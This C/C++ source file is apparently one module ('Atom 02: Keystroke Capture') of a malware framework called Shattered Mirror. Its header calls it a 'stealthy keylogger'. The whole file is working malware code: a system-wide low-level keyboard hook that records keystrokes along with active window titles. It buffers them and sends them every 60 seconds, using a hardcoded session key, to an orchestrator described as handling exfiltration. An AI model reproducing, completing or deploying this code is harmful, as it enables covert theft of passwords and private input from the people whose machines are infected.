/*=============================================================================
 * Shattered Mirror v1 — Atom 02: Keystroke Capture
 *
 * Implements a stealthy keylogger using WH_KEYBOARD_LL.
 * Captures active window titles when focus changes to give context to keys.
 * Buffers data and pushes it to the Orchestrator via IPC for exfil.
 *===========================================================================*/

#include "Atom_02_Key.h"
#include "../Orchestrator/AtomManager.h"
#include <cstdio>

/* The ring buffer for keystrokes */
static char  s_KeyBuffer[KEYLOG_BUFFER_SIZE] = { 0 };
static DWORD s_dwBufferIndex = 0;

/* Handle to the hook */
static HHOOK s_hKeyHook = NULL;

/* Track window changes */
static HWND s_hLastWindow = NULL;

/* 
 * Helper to map virtual keys to ascii. 
 * Kept simple for MVP; a full implementation handles shift state, caps lock, etc.
 */
static void TranslateKey(DWORD vkCode, char* szOut) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    
    WORD ascii = 0;
    int len = ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &ascii, 0);
    
    if (len == 1) {
        szOut[0] = (char)ascii;
        szOut[1] = '\0';
    } else {
        /* Map special keys */
        switch (vkCode) {
            case VK_RETURN: lstrcpyA(szOut, "[ENTER]"); break;
            case VK_BACK:   lstrcpyA(szOut, "[BACK]"); break;
            case VK_TAB:    lstrcpyA(szOut, "[TAB]"); break;
            case VK_SPACE:  lstrcpyA(szOut, " "); break;
            default:        szOut[0] = '\0'; break;
        }
    }
}

/*---------------------------------------------------------------------------
 *  LowLevelKeyboardProc
 *  The callback that intercepts keystrokes system-wide.
 *-------------------------------------------------------------------------*/
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
        
        /* Check active window to provide context */
        HWND hForeground = GetForegroundWindow();
        if (hForeground != s_hLastWindow) {
            s_hLastWindow = hForeground;
            char szTitle[256] = { 0 };
            GetWindowTextA(hForeground, szTitle, 255);
            
            char szHeader[300];
            wsprintfA(szHeader, "\r\n\r\n[WND: %s]\r\n", szTitle);
            
            DWORD headerLen = lstrlenA(szHeader);
            if (s_dwBufferIndex + headerLen < KEYLOG_BUFFER_SIZE) {
                lstrcpyA(&s_KeyBuffer[s_dwBufferIndex], szHeader);
                s_dwBufferIndex += headerLen;
            }
        }

        /* Translate and log the key */
        char szKey[16] = { 0 };
        TranslateKey(pkbhs->vkCode, szKey);
        
        DWORD keyLen = lstrlenA(szKey);
        if (keyLen > 0 && (s_dwBufferIndex + keyLen < KEYLOG_BUFFER_SIZE)) {
            lstrcpyA(&s_KeyBuffer[s_dwBufferIndex], szKey);
            s_dwBufferIndex += keyLen;
        }
    }
    
    return CallNextHookEx(s_hKeyHook, nCode, wParam, lParam);
}

/*---------------------------------------------------------------------------
 *  FlushKeyBufferToIPC
 *  Called periodically or on demand. Wraps the keys in an IPC_MESSAGE
 *  and sends to the Orchestrator for exfil.
 *-------------------------------------------------------------------------*/
BOOL FlushKeyBufferToIPC(HANDLE hPipe, BYTE* pSharedKey) {
    if (s_dwBufferIndex == 0) return TRUE; /* Nothing to flush */

    IPC_MESSAGE msg = { 0 };
    msg.CommandId = CMD_REPORT;
    msg.dwPayloadLen = s_dwBufferIndex;
    
    /* Copy data */
    memcpy(msg.Payload, s_KeyBuffer, s_dwBufferIndex);
    
    /* Send it */
    BOOL bSuccess = IPC_SendMessage(hPipe, &msg, pSharedKey, 16); 
    
    if (bSuccess) {
        /* Reset buffer */
        memset(s_KeyBuffer, 0, KEYLOG_BUFFER_SIZE);
        s_dwBufferIndex = 0;
    }
    
    return bSuccess;
}

/*---------------------------------------------------------------------------
 *  KeyloggerAtomMain
 *  Sets the hook and spins up the message pump required for hooks to work.
 *-------------------------------------------------------------------------*/
DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    
    /* Connect to Orchestrator */
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;
    
    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";

    /* Set the system-wide hook. Requires user32.dll */
    s_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!s_hKeyHook) return 1;

    DWORD dwLastFlush = GetTickCount();

    /* A message loop is strictly required for WH_KEYBOARD_LL */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        /* Flush every 60 seconds with standard IPC reporting */
        if (GetTickCount() - dwLastFlush > 60000) {
            if (s_dwBufferIndex > 0) {
                IPC_MESSAGE reportMsg = { 0 };
                reportMsg.CommandId = CMD_REPORT;
                reportMsg.dwPayloadLen = s_dwBufferIndex;
                memcpy(reportMsg.Payload, s_KeyBuffer, s_dwBufferIndex);
                IPC_SendMessage(hPipe, &reportMsg, SharedSessionKey, 16);
                s_dwBufferIndex = 0;
            }
            dwLastFlush = GetTickCount();
        }
    }

    UnhookWindowsHookEx(s_hKeyHook);
    return 0;
}
